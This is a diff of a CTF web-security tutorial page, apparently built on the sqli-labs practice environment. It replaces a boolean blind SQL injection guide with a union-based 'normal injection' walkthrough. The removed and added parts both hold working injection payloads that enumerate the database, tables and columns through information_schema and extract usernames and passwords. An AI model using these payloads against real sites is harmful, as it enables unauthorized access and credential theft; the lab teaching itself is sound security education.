@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/">
+        <link rel="prev" href="../SQL-3-information_schema%E5%88%A9%E7%94%A8/">
       
       
-        <link rel="next" href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/">
+        <link rel="next" href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>bool盲注思路 - CTF-Web修炼手册</title>
+        <title>SQL-4-普通注入 - CTF-Web修炼手册</title>
       
     
     
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#1-http1016238081less-1id1-order-by-3-" class="md-skip">
           跳转至
         </a>
       
@@ -108,7 +108,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              bool盲注思路
+              SQL-4-普通注入
             
           </span>
         </div>
@@ -230,7 +230,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-tabs__link">
+        <a href="../ENV-1-Mysql%E5%AE%89%E8%A3%85/" class="md-tabs__link">
           
   
   
@@ -252,7 +252,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-tabs__link">
+        <a href="../SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-tabs__link">
           
   
   
@@ -391,12 +391,35 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
+      <a href="../ENV-1-Mysql%E5%AE%89%E8%A3%85/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    SQL-Hackbar 安装
+    ENV-1-MySQL 安装
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ENV-2-SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ENV-2-SQL-Hackbar 安装
     
   </span>
   
@@ -469,12 +492,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-nav__link">
+      <a href="../SQL-1-Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    注入中的关键词
+    SQL-1-MySQL 系统表
     
   </span>
   
@@ -492,12 +515,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-2-information_schema%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      <a href="../SQL-2-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    information_schema利用
+    SQL-2-注入中的关键词
     
   </span>
   
@@ -515,12 +538,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+      <a href="../SQL-3-information_schema%E5%88%A9%E7%94%A8/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    普通注入
+    SQL-3-information_schema利用
     
   </span>
   
@@ -550,7 +573,7 @@
   
   
   <span class="md-ellipsis">
-    bool盲注思路
+    SQL-4-普通注入
     
   </span>
   
@@ -563,7 +586,7 @@
   
   
   <span class="md-ellipsis">
-    bool盲注思路
+    SQL-4-普通注入
     
   </span>
   
@@ -584,9 +607,63 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#1-http1016238081less-1id1-order-by-3-" class="md-nav__link">
     <span class="md-ellipsis">
-      基本思路
+      1. http://10.16.2.3:8081/Less-1/?id=1' order by 3 --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-http1016238081less-1id-1-union-select-123-" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,3 --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-http1016238081less-1id-1-union-select-1databaseversion-" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,database(),version() --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-http1016238081less-1id-1-union-select-12group_concattable_name-from-information_schematables-where-table_schemasecurity-" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-http1016238081less-1id-1-union-select-12group_concatcolumn_name-from-information_schemacolumns-where-table_nameusers-" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,id , password) from users --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,'-',id,'-' , password) from users --+
     </span>
   </a>
   
@@ -608,12 +685,35 @@
   
   
     <li class="md-nav__item">
-      <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="md-nav__link">
+      <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    bool盲注逻辑参考
+    SQL-5-bool盲注思路
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-6-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL-6-bool盲注逻辑参考
     
   </span>
   
@@ -731,9 +831,63 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#1-http1016238081less-1id1-order-by-3-" class="md-nav__link">
     <span class="md-ellipsis">
-      基本思路
+      1. http://10.16.2.3:8081/Less-1/?id=1' order by 3 --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-http1016238081less-1id-1-union-select-123-" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,3 --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-http1016238081less-1id-1-union-select-1databaseversion-" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,database(),version() --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-http1016238081less-1id-1-union-select-12group_concattable_name-from-information_schematables-where-table_schemasecurity-" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-http1016238081less-1id-1-union-select-12group_concatcolumn_name-from-information_schemacolumns-where-table_nameusers-" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,id , password) from users --+
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,'-',id,'-' , password) from users --+
     </span>
   </a>
   
@@ -755,107 +909,80 @@
 
 
 
-  <h1>bool盲注思路</h1>
+  <h1>SQL-4-普通注入</h1>
 
-<h3 id="_1">基本思路</h3>
+<p>攻击过程一般分为以下几个步骤：</p>
 <ol>
-<li><strong>注入点检测</strong></li>
+<li><strong>测试SQL注入漏洞</strong>：通过插入简单的SQL代码，确认是否存在注入漏洞。</li>
+<li><strong>确定查询的列数</strong>：通过<code>ORDER BY</code>或<code>UNION</code>来确定数据库查询中返回的列数。</li>
+<li><strong>获取数据库信息</strong>：通过查询数据库名称、版本等基本信息来了解数据库环境。</li>
+<li><strong>获取表和列信息</strong>：通过查询<code>information_schema</code>等系统表，获取数据库中的表和列信息。</li>
+<li><strong>提取敏感数据</strong>：最终，通过<code>GROUP_CONCAT</code>等函数获取敏感数据，如用户名、ID、密码等。</li>
 </ol>
-<p>找到一个可以进行注入的参数位置，通常通过简单的测试 <code>1=1</code>（始终为真）和 <code>1=2</code>（始终为假）的情况观察响应的变化。例如：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>http://example.com/item?id=1 AND 1=1   --&gt; 页面正常显示
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>http://example.com/item?id=1 AND 1=2   --&gt; 页面异常或不同
-</code></pre></div>
-<p>如果响应页面存在显著差异，说明该参数存在布尔盲注的可能性。</p>
+<p>详细过程如下：</p>
+<h3 id="1-http1016238081less-1id1-order-by-3-">1. <strong><code>http://10.16.2.3:8081/Less-1/?id=1' order by 3 --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 测试是否存在SQL注入漏洞。</p>
+<ul>
+<li><strong><code>id=1'</code></strong>：这个部分插入了一个闭合单引号（<code>'</code>），它试图结束掉原始的SQL语句，并引入新的SQL代码。通常，应用程序在执行查询时会拼接SQL语句，如果没有进行正确的参数化处理，注入攻击会成功。</li>
+<li><strong><code>order by 3</code></strong>：这是尝试通过SQL语句的<code>ORDER BY</code>子句来确定数据库中有多少列。这里<code>3</code>表示按第3列排序。如果数据库表中没有第3列，SQL会报错，攻击者可以通过调整这个数字来确定实际列数。</li>
+<li><strong><code>--+</code></strong>：这是SQL的注释符号。<code>--</code>表示注释的开始，<code>+</code>用于在URL编码中确保其作为注释符号被正确传递。它会将<code>ORDER BY 3</code>后面的内容视为注释，从而防止SQL语句后续的部分执行。</li>
+</ul>
+<p><strong>攻击目标：</strong> 测试系统是否容易受SQL注入影响，并尝试找出数据库查询中包含的列数。</p>
 <hr />
-<ol>
-<li>
-<p><strong>推测数据结构</strong>      使用逐步的逻辑表达式查询数据库元信息：</p>
-</li>
-<li>
-<p>推测当前使用的数据库：</p>
-</li>
-</ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;test%&#39;</span>
-</code></pre></div>
-<p>判断当前数据库名是否以 <code>test</code> 开头。</p>
+<h3 id="2-http1016238081less-1id-1-union-select-123-">2. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,3 --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 通过<code>UNION</code>查询来获取数据库的更多信息。</p>
 <ul>
-<li>获取数据库长度：</li>
+<li><strong><code>id=-1'</code></strong>：与上一步类似，注入了一个闭合单引号（<code>'</code>）来结束原本的查询。</li>
+<li><strong><code>union select 1,2,3</code></strong>：<code>UNION</code>用于将两个<code>SELECT</code>查询的结果合并。在这种情况下，攻击者尝试返回3列的查询结果。前两个列（<code>1</code>和<code>2</code>）是占位符，而第三个列（<code>3</code>）可以是其他数据。如果这个查询成功，则说明数据库查询的列数至少是3。</li>
+<li><strong><code>--+</code></strong>：注释符号，防止SQL查询后续部分的执行。</li>
 </ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">(</span><span class="k">DATABASE</span><span class="p">())</span><span class="o">=</span><span class="mi">4</span>
-</code></pre></div>
-<p>判断当前数据库名是否为 4 个字符 ，可以写成循环来判断。</p>
-<ul>
-<li>字符逐个推测： 假设数据库名长度为 4，逐字符尝试：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">DATABASE</span><span class="p">(),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="w">  </span><span class="c1">--&gt; 第一个字符是否是 &#39;t&#39;</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">DATABASE</span><span class="p">(),</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;e&#39;</span><span class="w">  </span><span class="c1">--&gt; 第二个字符是否是 &#39;e&#39;</span>
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">DATABASE</span><span class="p">(),</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;s&#39;</span><span class="w">  </span><span class="c1">--&gt; 第三个字符是否是 &#39;s&#39;</span>
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">DATABASE</span><span class="p">(),</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;t&#39;</span><span class="w">  </span><span class="c1">--&gt; 第四个字符是否是 &#39;t&#39;</span>
-</code></pre></div>
+<p><strong>攻击目标：</strong> 确认SQL查询中能返回的列数，并为进一步的注入操作做好准备。</p>
 <hr />
-<ol>
-<li>
-<p><strong>获取表名</strong>   使用 <code>information_schema.tables</code>  推测表名：</p>
-</li>
-<li>
-<p>获取表的数量：</p>
-</li>
-</ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">())</span><span class="o">=</span><span class="mi">5</span>
-</code></pre></div>
-<p>判断当前数据库中是否有 5 个表，可以写成循环来判断。</p>
+<h3 id="3-http1016238081less-1id-1-union-select-1databaseversion-">3. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,database(),version() --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 获取数据库的基本信息。</p>
 <ul>
-<li>获取表名长度：</li>
+<li><code>union select 1,database(),version()</code></li>
 </ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">6</span>
+<p>：这部分查询尝试通过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>UNION
 </code></pre></div>
-<p>判断第一个表的名称长度为 6，可以写成循环来判断。</p>
+<p>查询获取两个数据库信息：</p>
 <ul>
-<li>推测表名字符：</li>
+<li><code>1</code>：一个占位符。</li>
+<li><code>database()</code>：一个SQL函数，返回当前使用的数据库名称。</li>
+<li><code>version()</code>：一个SQL函数，返回数据库的版本信息。</li>
 </ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;u&#39;</span>
-</code></pre></div>
+<p>通过这种方式，攻击者可以获取有关数据库的名称和版本等敏感信息。</p>
 <hr />
-<ol>
-<li><strong>获取字段名</strong></li>
-</ol>
-<p>使用 <code>information_schema.columns</code> 获取字段名：</p>
+<h3 id="4-http1016238081less-1id-1-union-select-12group_concattable_name-from-information_schematables-where-table_schemasecurity-">4. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 获取数据库中表的名称。</p>
 <ul>
-<li>获取字段数量：</li>
+<li><strong><code>group_concat(table_name)</code></strong>：<code>group_concat</code>是一个SQL聚合函数，允许将多个结果行连接成一个单一的字符串。在这里，攻击者试图从<code>information_schema.tables</code>中获取所有表名，并将它们连接成一个字符串。</li>
+<li><strong><code>where table_schema='security'</code></strong>：这是一个条件子句，限定了查询的范围，只获取数据库<code>security</code>中的表信息。<code>information_schema.tables</code>是一个系统表，包含了数据库中所有表的元数据。</li>
 </ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">=</span><span class="mi">3</span>
-</code></pre></div>
-<p>判断表 <code>users</code> 中是否有 3 个字段，可以写成循环来判断。</p>
-<ul>
-<li>获取字段名长度，可以写成循环来判断：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">5</span>
-</code></pre></div>
-<ul>
-<li>推测字段名字符，可以写成循环来判断：</li>
-</ul>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">DATABASE</span><span class="p">()</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;i&#39;</span>
-</code></pre></div>
+<p><strong>攻击目标：</strong> 获取目标数据库中所有表的名称。</p>
 <hr />
-<ol>
-<li><strong>获取字段值</strong></li>
-</ol>
-<p>使用逐字符猜测字段值：</p>
+<h3 id="5-http1016238081less-1id-1-union-select-12group_concatcolumn_name-from-information_schemacolumns-where-table_nameusers-">5. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 获取某个表（例如<code>users</code>表）中的列名称。</p>
 <ul>
-<li>
-<p>假设字段 <code>password</code>在表<code>users</code>中：</p>
-</li>
-<li>
-<p>获取字段值长度：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">LENGTH</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">8</span>
-</code></pre></div>
-</li>
-<li>
-<p>获取字段值字符：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;p&#39;</span>
-</code></pre></div>
-</li>
+<li><strong><code>group_concat(column_name)</code></strong>：类似于上一步，攻击者尝试通过<code>group_concat</code>获取<code>users</code>表中的所有列名，并将它们连接成一个字符串。</li>
+<li><strong><code>where table_name='users'</code></strong>：这个条件子句指定了只查询<code>users</code>表的列信息。</li>
 </ul>
+<p><strong>攻击目标：</strong> 获取<code>users</code>表中所有列的名称。</p>
+<hr />
+<h3 id="6-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-">6. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,id , password) from users --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 获取用户表中的敏感数据（如用户名、ID和密码）。</p>
+<ul>
+<li><strong><code>group_concat(username ,id , password)</code></strong>：攻击者试图获取<code>users</code>表中的<code>username</code>（用户名）、<code>id</code>（用户ID）和<code>password</code>（用户密码）字段的值，并将它们连接成一个字符串。</li>
+</ul>
+<p><strong>攻击目标：</strong> 获取<code>users</code>表中的所有用户信息（用户名、ID和密码）。这些数据对于进一步的攻击（如登陆攻击）非常有价值。</p>
+<hr />
+<h3 id="7-http1016238081less-1id-1-union-select-12group_concatusername-id-password-from-users-">7. <strong><code>http://10.16.2.3:8081/Less-1/?id=-1' union select 1,2,group_concat(username ,'-',id,'-' , password) from users --+</code></strong></h3>
+<p><strong>攻击目的：</strong> 改进之前的注入，获取数据格式化后输出。</p>
+<ul>
+<li><strong><code>group_concat(username ,'-',id,'-' , password)</code></strong>：这里，攻击者使用<code>'-'</code>作为分隔符来格式化输出数据。相比之前的查询，这种格式的输出更容易在后续处理中解析（例如，分割用户名、ID和密码）。</li>
+</ul>
+<p><strong>攻击目标：</strong> 以更易读或可解析的格式获取<code>users</code>表中的敏感数据（用户名、ID和密码）。</p>
 
 
 
